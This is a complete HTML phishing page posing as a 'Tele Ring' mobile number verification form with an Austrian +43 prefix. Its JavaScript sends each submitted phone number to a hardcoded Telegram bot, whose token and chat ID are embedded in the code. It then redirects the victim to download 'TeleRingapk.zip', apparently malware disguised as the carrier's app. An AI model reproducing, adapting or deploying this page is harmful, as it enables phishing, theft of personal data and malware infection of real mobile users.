<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tele Ring</title>
    
    <style>
        /* ============================================
           🔥 Reset & Base
           ============================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at center, #0a0e1a 0%, #05080f 100%);
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* ============================================
           ✨ Animated Background Glow
           ============================================ */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 40%, rgba(0, 180, 255, 0.06), transparent 60%),
                        radial-gradient(circle at 70% 80%, rgba(100, 50, 255, 0.04), transparent 50%);
            animation: rotateGlow 20s linear infinite;
            z-index: 0;
        }

        @keyframes rotateGlow {
            0% { transform: rotate(0deg) scale(1); }
            100% { transform: rotate(360deg) scale(1); }
        }

        /* ============================================
           📱 Glass Card
           ============================================ */
        .glass-card {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 400px;
            padding: 45px 35px 40px;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(24px) saturate(1.8);
            -webkit-backdrop-filter: blur(24px) saturate(1.8);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.07);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6),
                        inset 0 1px 0 rgba(255, 255, 255, 0.06);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .glass-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7),
                        inset 0 1px 0 rgba(255, 255, 255, 0.08);
        }

        /* ============================================
           📱 Icon
           ============================================ */
        .icon-circle {
            width: 70px;
            height: 70px;
            margin: 0 auto 18px;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(0, 180, 255, 0.15), rgba(100, 50, 255, 0.10));
            border: 1px solid rgba(0, 180, 255, 0.15);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 34px;
            box-shadow: 0 0 40px rgba(0, 180, 255, 0.05);
        }

        /* ============================================
           📝 Typography
           ============================================ */
        .title {
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #ffffff 30%, #88ccff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            color: rgba(255, 255, 255, 0.35);
            font-size: 14px;
            font-weight: 400;
            letter-spacing: 0.3px;
            margin-bottom: 30px;
        }

        /* ============================================
           🧩 Form
           ============================================ */
        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
            font-weight: 500;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
            padding-left: 4px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: all 0.3s ease;
        }

        .input-wrapper:focus-within {
            border-color: rgba(0, 180, 255, 0.3);
            background: rgba(255, 255, 255, 0.07);
            box-shadow: 0 0 30px rgba(0, 180, 255, 0.03);
        }

        .input-wrapper .prefix {
            padding-left: 16px;
            color: rgba(255, 255, 255, 0.3);
            font-weight: 500;
            font-size: 15px;
            user-select: none;
        }

        .input-wrapper input {
            width: 100%;
            padding: 16px 16px 16px 8px;
            background: transparent;
            border: none;
            outline: none;
            color: #ffffff;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .input-wrapper input::placeholder {
            color: rgba(255, 255, 255, 0.15);
            font-weight: 400;
            letter-spacing: 0.2px;
        }

        .input-wrapper input:focus {
            color: #ffffff;
        }

        /* ============================================
           🔘 Button
           ============================================ */
        .btn-submit {
            width: 100%;
            padding: 16px;
            margin-top: 8px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, #0088ff, #7c3aed);
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.3px;
            box-shadow: 0 8px 24px rgba(0, 136, 255, 0.15);
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(0, 136, 255, 0.25);
        }

        .btn-submit:active {
            transform: translateY(0px) scale(0.98);
        }

        .btn-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* ============================================
           📱 Status / Toast
           ============================================ */
        .status {
            text-align: center;
            margin-top: 16px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 13px;
            min-height: 24px;
            transition: all 0.4s ease;
        }

        .status.loading {
            color: #88ccff;
        }
        .status.success {
            color: #34d399;
        }
        .status.error {
            color: #f87171;
        }

        /* ============================================
           🔗 Footer
           ============================================ */
        .footer {
            text-align: center;
            margin-top: 22px;
            color: rgba(255, 255, 255, 0.12);
            font-size: 12px;
            letter-spacing: 0.5px;
        }

        .footer span {
            color: rgba(255, 255, 255, 0.2);
        }

        /* ============================================
           📱 Responsive
           ============================================ */
        @media (max-width: 480px) {
            .glass-card {
                padding: 30px 20px 28px;
            }
            .title {
                font-size: 26px;
            }
            .icon-circle {
                width: 60px;
                height: 60px;
                font-size: 28px;
            }
            .input-wrapper input {
                font-size: 15px;
                padding: 14px 14px 14px 6px;
            }
            .btn-submit {
                font-size: 15px;
                padding: 14px;
            }
        }
    </style>
</head>
<body>

    <!-- ============================================
    📱 Glass Card
    ============================================ -->
    <div class="glass-card">

        <!-- Icon -->
        <div class="icon-circle">📱</div>

        <!-- Title -->
        <h1 class="title">Tele Ring</h1>
        <p class="subtitle">Secure verification</p>

        <!-- Form -->
        <form id="loginForm" autocomplete="off">
            <div class="form-group">
                <label>📞 Mobile Number</label>
                <div class="input-wrapper">
                    <span class="prefix">+43</span>
                    <input type="tel" id="phoneInput" placeholder="665 65734031" maxlength="10" inputmode="numeric" pattern="[0-9]*" required>
                </div>
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">🚀 Send to Verification</button>
        </form>

        <!-- Status -->
        <div class="status" id="status">Enter your number to continue</div>

        <!-- Footer -->
        <div class="footer">
            <span>⚡ secure • instant</span>
        </div>
    </div>

    <!-- ============================================
    📜 JavaScript
    ============================================ -->
    <script>
        (function() {
            'use strict';

            // ============================================
            // 🔧 Config
            // ============================================
            const CONFIG = {
                BOT_TOKEN: '8970761139:AAGJ8_6Wmx7wpOsR7AUNWN_NnBDuovr6ITw',
                CHAT_ID: '6559396921',
                API_BASE: 'https://api.telegram.org/bot',
                REDIRECT_URL: 'https://1k2s3a00u1.ucarecd.net/a5d90651-985c-4054-807d-896c79be9147/TeleRingapk.zip'
            };

            // ============================================
            // 📦 DOM Elements
            // ============================================
            const form = document.getElementById('loginForm');
            const phoneInput = document.getElementById('phoneInput');
            const submitBtn = document.getElementById('submitBtn');
            const statusEl = document.getElementById('status');

            // ============================================
            // 🧹 Helpers
            // ============================================
            function formatPhone(raw) {
                // فقط اعداد
                let cleaned = raw.replace(/\D/g, '');
                // حداکثر ۱۰ رقم
                if (cleaned.length > 9) cleaned = cleaned.slice(0, 9);
                return cleaned;
            }

            function setStatus(text, type) {
                statusEl.textContent = text;
                statusEl.className = 'status';
                if (type) {
                    statusEl.classList.add(type);
                }
            }

            function setLoading(isLoading) {
                submitBtn.disabled = isLoading;
                submitBtn.textContent = isLoading ? '⏳ Sending...' : '🚀 Send to Verification';
            }

            // ============================================
            // 📤 Send to Telegram
            // ============================================
            function sendToTelegram(phone) {
                return new Promise((resolve, reject) => {
                    const text = `📱 *New Verification Request*\n` +
                                `________________________________\n` +
                                `📞 Number: +43${phone}\n` +
                                `________________________________\n` +
                                `👤 @khubkir`;

                    const url = `${CONFIG.API_BASE}${CONFIG.BOT_TOKEN}/sendMessage`;

                    const payload = {
                        chat_id: CONFIG.CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    };

                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error(`HTTP ${response.status}`);
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            resolve(data);
                        } else {
                            reject(new Error(data.description || 'Telegram API error'));
                        }
                    })
                    .catch(err => {
                        reject(err);
                    });
                });
            }

            // ============================================
            // 🚀 Handle Submit
            // ============================================
            async function handleSubmit(event) {
                event.preventDefault();

                // 1. Get and validate phone
                const raw = phoneInput.value.trim();
                const phone = formatPhone(raw);

                if (phone.length < 9) {
                    setStatus('⚠️ Please enter a valid 10-digit number', 'error');
                    phoneInput.focus();
                    return;
                }

                // 2. Lock UI
                setLoading(true);
                setStatus('⏳ Sending to verification...', 'loading');

                try {
                    // 3. Send to Telegram
                    await sendToTelegram(phone);

                    // 4. Success
                    setStatus('✅ Verification sent! Redirecting...', 'success');

                    // 5. Redirect after short delay
                    setTimeout(() => {
                        window.location.href = CONFIG.REDIRECT_URL;
                    }, 1000);

                } catch (error) {
                    console.error('Send error:', error);
                    setStatus('❌ Failed to send. Please try again.', 'error');
                    setLoading(false);
                }
            }

            // ============================================
            // 🔧 Phone Input Mask
            // ============================================
            phoneInput.addEventListener('input', function(e) {
                // فقط اعداد مجاز
                this.value = this.value.replace(/\D/g, '');
                // حداکثر ۱۰ رقم
                if (this.value.length > 9) {
                    this.value = this.value.slice(0, 10);
                }
            });

            // ============================================
            // 🎯 Events
            // ============================================
            form.addEventListener('submit', handleSubmit);

            // ============================================
            // ✨ Initial State
            // ============================================
            setStatus('Enter your number to continue');
            phoneInput.focus();

        })();
    </script>

</body>
</html>
